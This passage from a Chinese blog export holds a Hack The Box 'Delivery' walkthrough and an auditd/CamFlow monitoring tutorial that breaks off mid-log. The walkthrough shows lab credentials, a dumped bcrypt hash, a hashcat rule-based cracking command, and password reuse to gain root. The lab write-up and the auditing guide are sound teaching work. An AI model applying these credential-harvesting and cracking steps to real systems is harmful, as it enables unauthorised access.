是一种开源的，可自托管的在线聊天服务，用于公司内部的聊天。 3.Enumeration: MatterMost先从MatterMost入手，在ExploitDB上没有发现MatterMost的相关漏洞，然后看一下website页面上的内容，点击Create one now，尝试注册一个新账号，但是需要邮箱验证，但是注册时填写的邮箱又收不到验证邮件(应该时HTB上的机器无法向外发送邮件)： 4.Enumeration: Help Desk打开 http://helpdesk.delivery.htb/ 尝试从HelpDesk页面取得突破，这个服务看起来是由osTicket’s Support Ticket System提供的，是广泛使用且值得信赖的开源支持票务系统。 尝试创建一个用户，点击Open a New Ticket，按照提示，完成注册： !!!惊喜，发现我们得到了一个@delivery.htb邮箱，想到在第二步中CONTACT US页面的内容了吗，我们可以用这个邮箱去通过MatterMost的验证，点击View Ticket Thread，使用注册时的邮箱和注册成功后的ticket id登录； 5.Accessing MatterMost既然得到了@delivery.htb的邮箱，可以继续突破MatterMost了，使用该邮箱注册MatterMost： 注册成功时提示去验证邮箱，然后去HelpDesk服务页面刷新View Ticket Thread，即可看到验证链接： 验证链接： 1http:&#x2F;&#x2F;delivery.htb:8065&#x2F;do_verify_email?token&#x3D;mbke8qepod1htgm4ttpptfbmsp4ecucq1hkdwt4r6i5jwpdi3ocq7a1itzp68any&amp;email&#x3D;6236837%40delivery.htb 点击后即提示Email Verified，然后根据注册时的账户密码登录即可， 这个图里的聊天内容部分有两个关键信息： 12Credentials to the server are maildeliverer:Youve_G0t_Mail! stop re-using the same passwords everywhere.... Especially those that are a variant of &quot;PleaseSubscribe!&quot; 可以通过ssh credentials登录该主机,目标对象为&#x6d;&#97;&#x69;&#108;&#100;&#x65;&#x6c;&#x69;&#x76;&#x65;&#x72;&#x65;&#114;&#x40;&#49;&#48;&#46;&#49;&#48;&#x2e;&#49;&#48;&#46;&#50;&#50;&#50;,密码为Youve_G0t_Mail! 登录成功，但这只是普通用户，得想办法搞搞root用户。 6.Privilege Escalation切换root账户需要密码无法直接登录，得另寻办法了。利用netstat查看运行的服务，发现3306端口被占用，即mysql在运行: 可以理解，ticketing system需要一种方式存取数据，并且MatterMost应该也用到了mysql，需要找到数据库的登录凭证。 经查阅资料MatterMost的配置文件在/opt/mattermost/config/config.json，其中SqlSetting中包含MySQL的登录凭证信息： 发现用户名、密码、数据库名信息，数据库名为mattermost，登录数据库： 12mysql -u mmuser -ppassword: Crack_The_MM_Admin_PW 在mattermost数据库下的Users表中发现关键信息： 1root : $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO 虽然这个root用户是MatterMost账户里名为root的用户，但根据第5步中得到的聊天内容中的re-using可以合理猜测主机的root用户也是该密码。 7.Cracking the Password with hashcat拿到了root用户的密码hash值后，可以使用hashcat进行破解。在破解之前，首先需要知道加密方式和密码字典等信息，还记得第5步中得到的聊天内容的关键信息吗： 12Credentials to the server are maildeliverer:Youve_G0t_Mail! stop re-using the same passwords everywhere.... Especially those that are a variant of &quot;PleaseSubscribe!&quot; 可以使用hashcat基于规则的攻击，且PleaseSubscribe!作为单词表，接下来可以开始攻击破解密码： Identifying the Hash Type 首先需要确定加密方式，可以使用kali自带的hashid得到加密方式为bcrypt：查阅资料bcrypt在hashcat中对应的模式为3200。 Hashcat Rules 基于规则的攻击是所有攻击模式中最复杂的一种。因为基于规则的攻击就像是用于生成密码候选者的编程语言。这里直接用github的开源规则：https://github.com/praetorian-inc/Hob0Rules ，将文件git下来即可。 Putting It All Together 利用hashcat进行破解： 12345678hashcat -a 0 -m 3200 hash.txt wordlist.txt -r Hob0Rules&#x2F;d3adhob0.rule -o cracked.txt -w 3 -O-a 0：表示攻击模式，表示使用规则生成的所有密码空间-m 3200：表示使用bcrypt加密方式hash.txt：文本内容为需要被破解的哈希值wordlist.txt：表示破解需要使用的字典，如PleaseSubscribe!-r Hob0Rules&#x2F;d3adhob0.rule：指明使用的规则-o cracked.txt：表明输出结果 经过半个小时后得到密码PleaseSubscribe!21： 8.Owning Root破解出了MatterMost账户里名为root的用户的密码，猜测主机密码也是这个，从maildeliverer用户切换到root用户： 12su - rootpassword: PleaseSubscribe!21 登录root用户后，在当前目录读root.txt的内容，得到flag:2994a60a63ea6d88fbae4266b3787553 Now it’s time to party!","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://wxt406611016.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"audit+camflow使用记录","slug":"audit+camflow使用记录","date":"2021-01-31T16:00:00.000Z","updated":"2021-03-05T14:56:38.149Z","comments":true,"path":"2021/02/01/audit+camflow使用记录/","link":"","permalink":"https://wxt406611016.github.io/2021/02/01/audit+camflow%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/","excerpt":"auditd 实验系统：ubuntu 20.04 auditctl命令：用于制定规则 ausearch命令: 用于查看日志","text":"auditd 实验系统：ubuntu 20.04 auditctl命令：用于制定规则 ausearch命令: 用于查看日志 监控文件添加规则： 123sudo auditctl -w &#x2F;home&#x2F;supervampire&#x2F;passwd -p rwxa-w:指定要监控的路径，如passwd的文件路径-p:指定监控属性 执行查看passwd文件命令： 1cat &#x2F;home&#x2F;supervampire&#x2F;passwd 查看有关/home/supervampire/passwd的监控日志 123sudo ausearch -i -f &#x2F;home&#x2F;supervampire&#x2F;passwd-f:设置审计对象-i:对日志进行解释，不然日志文件内容包含16进制，不方便审计 查看文件对应的日志内容： 12345678910111213141516171819type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 10:03:36.061:128) : proctitle&#x3D;cat &#x2F;home&#x2F;supervampire&#x2F;passwd type&#x3D;PATH msg&#x3D;audit(2021年01月31日 10:03:36.061:128) : item&#x3D;0 name&#x3D;&#x2F;home&#x2F;supervampire&#x2F;passwd inode&#x3D;394571 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年01月31日 10:03:36.061:128) : cwd&#x3D;&#x2F;home&#x2F;supervampire type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 10:03:36.061:128) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;3 a0&#x3D;0xffffff9c a1&#x3D;0x7ffeb305c205 a2&#x3D;O_RDONLY a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;2790 pid&#x3D;5719 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;cat exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;cat subj&#x3D;unconfined key&#x3D;(null)2021年01月31日 10:03:36.061:128表示时间和事件id，其中128为事件idproctitle: 进程名time : 审计时间name : 审计对象pid : 进程号ppid : 父进程号cwd : 当前路径syscall : 相关的系统调用a0,a1,a2,a3 ：系统调用的前四个参数auid : 审计用户IDuid 和 gid : 访问文件的用户ID和用户组IDses: 对应进程的session IDcomm : 用户访问文件的命令exe : 上面命令的可执行文件路径 上述日志表明supervampire用户在/home/supervampire目录下，使用/usr/bin/cat可执行文件执行了cat /home/supervampire/passwd命令 执行写入文件命令： 1sed -e 2a\\balabala &#x2F;home&#x2F;supervampire&#x2F;passwd 写入文件对应的日志内容： 1234type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 15:00:42.302:543) : proctitle&#x3D;sed -e 2abalabala &#x2F;home&#x2F;supervampire&#x2F;passwd type&#x3D;PATH msg&#x3D;audit(2021年01月31日 15:00:42.302:543) : item&#x3D;0 name&#x3D;&#x2F;home&#x2F;supervampire&#x2F;passwd inode&#x3D;394572 dev&#x3D;08:05 mode&#x3D;file,644 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年01月31日 15:00:42.302:543) : cwd&#x3D;&#x2F;home&#x2F;supervampire type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 15:00:42.302:543) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;3 a0&#x3D;0xffffff9c a1&#x3D;0x7ffccb797724 a2&#x3D;O_RDONLY a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;6792 pid&#x3D;9240 auid&#x3D;supervampire uid&#x3D;root gid&#x3D;root euid&#x3D;root suid&#x3D;root fsuid&#x3D;root egid&#x3D;root sgid&#x3D;root fsgid&#x3D;root tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;sed exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;sed subj&#x3D;unconfined key&#x3D;(null) 上述日志表明root用户在/home/supervampire目录下，使用/usr/bin/sed可执行文件执行了sed -e 2abalabala /home/supervampire/passwd命令，向文件中插入数据”balabala” 执行删除文件命令： 1rm &#x2F;home&#x2F;supervampire&#x2F;passwd 删除文件对应的日志内容： 12345type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 11:43:25.478:420) : proctitle&#x3D;rm &#x2F;home&#x2F;supervampire&#x2F;passwd type&#x3D;PATH msg&#x3D;audit(2021年01月31日 11:43:25.478:420) : item&#x3D;1 name&#x3D;&#x2F;home&#x2F;supervampire&#x2F;passwd inode&#x3D;394584 dev&#x3D;08:05 mode&#x3D;file,644 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;DELETE cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;PATH msg&#x3D;audit(2021年01月31日 11:43:25.478:420) : item&#x3D;0 name&#x3D;&#x2F;home&#x2F;supervampire&#x2F; inode&#x3D;404570 dev&#x3D;08:05 mode&#x3D;dir,755 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;PARENT cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年01月31日 11:43:25.478:420) : cwd&#x3D;&#x2F;test type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 11:43:25.478:420) : arch&#x3D;x86_64 syscall&#x3D;unlinkat success&#x3D;yes exit&#x3D;0 a0&#x3D;0xffffff9c a1&#x3D;0x55e507fa85a0 a2&#x3D;0x0 a3&#x3D;0x0 items&#x3D;2 ppid&#x3D;6792 pid&#x3D;7713 auid&#x3D;supervampire uid&#x3D;root gid&#x3D;root euid&#x3D;root suid&#x3D;root fsuid&#x3D;root egid&#x3D;root sgid&#x3D;root fsgid&#x3D;root tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;rm exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;rm subj&#x3D;unconfined key&#x3D;(null) 上述日志表明root用户在/test目录下，使用/usr/bin/rm可执行文件执行了rm /home/supervampire/passwd命令，且type=PATH中，item1的nametype为DELETE； 监控网络添加规则： 12sudo auditctl -a always,exit -F arch&#x3D;b64 -S connect#定义一个规则，当每次使用系统调用connect，并且为64位架构，记录审计日志 执行curl命令： 1curl https:&#x2F;&#x2F;www.baidu.com 在var/log/audit/audit.log中搜索curl关键字，定位到事件id为550，执行sudo ausearch -i -a 550来审计事件550对应的curl日志内容： 123type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 16:17:24.721:550) : proctitle&#x3D;curl https:&#x2F;&#x2F;www.baidu.com type&#x3D;SOCKADDR msg&#x3D;audit(2021年01月31日 16:17:24.721:550) : saddr&#x3D;&#123; fam&#x3D;inet laddr&#x3D;112.80.248.76 lport&#x3D;443 &#125; type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 16:17:24.721:550) : arch&#x3D;x86_64 syscall&#x3D;connect success&#x3D;no exit&#x3D;EINPROGRESS(操作现在正在进行) a0&#x3D;0x5 a1&#x3D;0x7fff90c26d00 a2&#x3D;0x10 a3&#x3D;0x2 items&#x3D;0 ppid&#x3D;2801 pid&#x3D;3220 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;curl exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;curl subj&#x3D;unconfined key&#x3D;(null) 上述日志表明supervampire用户，使用/usr/bin/curl可执行文件执行了curl https://www.baidu.com 命令，并通过saddr看出请求的ip地址112.80.248.76； 使用firefox请求 baidu.com 根据关键字firefox定位到日志位置： 123type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 16:35:44.888:1643) : proctitle&#x3D;&#x2F;usr&#x2F;lib&#x2F;firefox&#x2F;firefox -new-window type&#x3D;SOCKADDR msg&#x3D;audit(2021年01月31日 16:35:44.888:1643) : saddr&#x3D;&#123; fam&#x3D;inet laddr&#x3D;112.80.248.75 lport&#x3D;443 &#125; type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 16:35:44.888:1643) : arch&#x3D;x86_64 syscall&#x3D;connect success&#x3D;no exit&#x3D;EINPROGRESS(操作现在正在进行) a0&#x3D;0x6a a1&#x3D;0x7f96ba361740 a2&#x3D;0x10 a3&#x3D;0x18 items&#x3D;0 ppid&#x3D;1870 pid&#x3D;3291 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;(none) ses&#x3D;3 comm&#x3D;Socket Thread exe&#x3D;&#x2F;usr&#x2F;lib&#x2F;firefox&#x2F;firefox subj&#x3D;unconfined key&#x3D;(null) 上述日志表明supervampire用户，使用/usr/lib/firefox/firefox可执行文件执行了/usr/lib/firefox/firefox -new-window，并通过saddr看出请求的ip地址，查询ip解析为百度域名； 监控进程添加规则： 123sudo auditctl -a always,exit -F arch&#x3D;b64 -S kill -F key&#x3D;kill_signalssudo auditctl -a always,exit -F arch&#x3D;b64 -S execve -F key&#x3D;exe_cmd#当使用kill和execve时，记入日志中 启动一个python进程，然后执行 kill.sh文件，kill.sh内容如下： 12#!&#x2F;bin&#x2F;shps -ef |grep app.py |awk &#39;&#123;print $2&#125;&#39;|xargs kill -9 通过sudo ausearch -i -k exe_cmd查看日志相关内容，其中key表示规则中定义的关键字，ausearch根据关键字搜索： 123456789101112131415161718192021222324252627282930313233343536373839404142type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 17:35:34.560:622) : proctitle&#x3D;&#x2F;bin&#x2F;sh .&#x2F;kill.sh type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.560:622) : item&#x3D;2 name&#x3D;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 inode&#x3D;137165 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.560:622) : item&#x3D;1 name&#x3D;&#x2F;bin&#x2F;sh inode&#x3D;131279 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.560:622) : item&#x3D;0 name&#x3D;.&#x2F;kill.sh inode&#x3D;394586 dev&#x3D;08:05 mode&#x3D;file,775 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年01月31日 17:35:34.560:622) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面 type&#x3D;EXECVE msg&#x3D;audit(2021年01月31日 17:35:34.560:622) : argc&#x3D;2 a0&#x3D;&#x2F;bin&#x2F;sh a1&#x3D;.&#x2F;kill.sh type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 17:35:34.560:622) : arch&#x3D;x86_64 syscall&#x3D;execve success&#x3D;yes exit&#x3D;0 a0&#x3D;0x56083a0e3330 a1&#x3D;0x56083a320e80 a2&#x3D;0x56083a0ba670 a3&#x3D;0x8 items&#x3D;3 ppid&#x3D;3698 pid&#x3D;4248 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts2 ses&#x3D;3 comm&#x3D;kill.sh exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;dash subj&#x3D;unconfined key&#x3D;exe_cmdtype&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 17:35:34.564:623) : proctitle&#x3D;ps -ef type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.564:623) : item&#x3D;1 name&#x3D;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 inode&#x3D;137165 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.564:623) : item&#x3D;0 name&#x3D;&#x2F;usr&#x2F;bin&#x2F;ps inode&#x3D;132043 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年01月31日 17:35:34.564:623) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面 type&#x3D;EXECVE msg&#x3D;audit(2021年01月31日 17:35:34.564:623) : argc&#x3D;2 a0&#x3D;ps a1&#x3D;-ef type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 17:35:34.564:623) : arch&#x3D;x86_64 syscall&#x3D;execve success&#x3D;yes exit&#x3D;0 a0&#x3D;0x5579d4381470 a1&#x3D;0x5579d4380f88 a2&#x3D;0x5579d4381268 a3&#x3D;0x5579d4381230 items&#x3D;2 ppid&#x3D;4248 pid&#x3D;4249 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts2 ses&#x3D;3 comm&#x3D;ps exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;ps subj&#x3D;unconfined key&#x3D;exe_cmdtype&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 17:35:34.564:624) : proctitle&#x3D;awk &#123;print $2&#125; type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.564:624) : item&#x3D;1 name&#x3D;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 inode&#x3D;137165 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.564:624) : item&#x3D;0 name&#x3D;&#x2F;usr&#x2F;bin&#x2F;awk inode&#x3D;131801 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年01月31日 17:35:34.564:624) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面 type&#x3D;EXECVE msg&#x3D;audit(2021年01月31日 17:35:34.564:624) : argc&#x3D;2 a0&#x3D;awk a1&#x3D;&#123;print $2&#125; type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 17:35:34.564:624) : arch&#x3D;x86_64 syscall&#x3D;execve success&#x3D;yes exit&#x3D;0 a0&#x3D;0x5579d43814d0 a1&#x3D;0x5579d4380f90 a2&#x3D;0x5579d43812c8 a3&#x3D;0x5579d4381238 items&#x3D;2 ppid&#x3D;4248 pid&#x3D;4251 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts2 ses&#x3D;3 comm&#x3D;awk exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;mawk subj&#x3D;unconfined key&#x3D;exe_cmdtype&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 17:35:34.564:625) : proctitle&#x3D;grep app.py type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.564:625) : item&#x3D;1 name&#x3D;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 inode&#x3D;137165 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.564:625) : item&#x3D;0 name&#x3D;&#x2F;usr&#x2F;bin&#x2F;grep inode&#x3D;131525 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年01月31日 17:35:34.564:625) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面 type&#x3D;EXECVE msg&#x3D;audit(2021年01月31日 17:35:34.564:625) : argc&#x3D;2 a0&#x3D;grep a1&#x3D;app.py type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 17:35:34.564:625) : arch&#x3D;x86_64 syscall&#x3D;execve success&#x3D;yes exit&#x3D;0 a0&#x3D;0x5579d43814a0 a1&#x3D;0x5579d4380f88 a2&#x3D;0x5579d4381298 a3&#x3D;0x5579d4381210 items&#x3D;2 ppid&#x3D;4248 pid&#x3D;4250 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts2 ses&#x3D;3 comm&#x3D;grep exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;grep subj&#x3D;unconfined key&#x3D;exe_cmdtype&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 17:35:34.564:626) : proctitle&#x3D;xargs kill -9 type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.564:626) : item&#x3D;1 name&#x3D;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 inode&#x3D;137165 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.564:626) : item&#x3D;0 name&#x3D;&#x2F;usr&#x2F;bin&#x2F;xargs inode&#x3D;132402 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年01月31日 17:35:34.564:626) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面 type&#x3D;EXECVE msg&#x3D;audit(2021年01月31日 17:35:34.564:626) : argc&#x3D;3 a0&#x3D;xargs a1&#x3D;kill a2&#x3D;-9 type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 17:35:34.564:626) : arch&#x3D;x86_64 syscall&#x3D;execve success&#x3D;yes exit&#x3D;0 a0&#x3D;0x5579d4381500 a1&#x3D;0x5579d4380fa0 a2&#x3D;0x5579d43812f8 a3&#x3D;0x5579d43811f0 items&#x3D;2 ppid&#x3D;4248 pid&#x3D;4252 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts2 ses&#x3D;3 comm&#x3D;xargs exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;xargs subj&#x3D;unconfined key&#x3D;exe_cmdtype&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 17:35:34.580:633) : proctitle&#x3D;xargs kill -9 type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.580:633) : item&#x3D;1 name&#x3D;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 inode&#x3D;137165 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.580:633) : item&#x3D;0 name&#x3D;&#x2F;usr&#x2F;bin&#x2F;kill inode&#x3D;131690 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年01月31日 17:35:34.580:633) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面 type&#x3D;EXECVE msg&#x3D;audit(2021年01月31日 17:35:34.580:633) : argc&#x3D;4 a0&#x3D;kill a1&#x3D;-9 a2&#x3D;3689 a3&#x3D;4250 type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 17:35:34.580:633) : arch&#x3D;x86_64 syscall&#x3D;execve success&#x3D;yes exit&#x3D;0 a0&#x3D;0x7ffc5620bf20 a1&#x3D;0x55c2c99ae690 a2&#x3D;0x7ffc5620c378 a3&#x3D;0x0 items&#x3D;2 ppid&#x3D;4252 pid&#x3D;4253 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts2 ses&#x3D;3 comm&#x3D;kill exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;kill subj&#x3D;unconfined key&#x3D;exe_cmd 根据pid进程号和ppid父进程号分析，可以得出进程ps，awk，grep，xargs拥有同一个父进程/bin/dash，其中xargs拥有一个子进程kill，表明dash进程调用了ps，awk，grep，xargs进程，xargs进程调用了kill进程，符合ps -ef |grep app.py |awk &#39;&#123;print $2&#125;&#39;|xargs kill -9的进程调用，结构图如下： CamFlow 实验系统：Fedora 添加规则：camflow 规则用法：https://camflow.org/#walk 日志位置：/tmp/audit.log 监控文件添加规则用于追踪fflag文件： 12sudo camflow --track-file &#x2F;home&#x2F;supervampire&#x2F;fflag true#跟踪fflag文件，和fflag文件相关的操作记录入日志中 执行查看fflag文件命令： 1cat &#x2F;home&#x2F;supervampire&#x2F;fflag 根据关键字fflag定位到日志位置：(日志由于太长只截取以下关键部分，完整日志点击链接，同时对日志内容进行了json格式化操作，方便阅读) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201&#123; &quot;entity&quot;: &#123; &quot;cf:AAEAAAAAACBMSQIAAAAAABQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;149836&quot;, &quot;prov:type&quot;: &quot;file&quot;, &quot;cf:boot_id&quot;: 20, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, 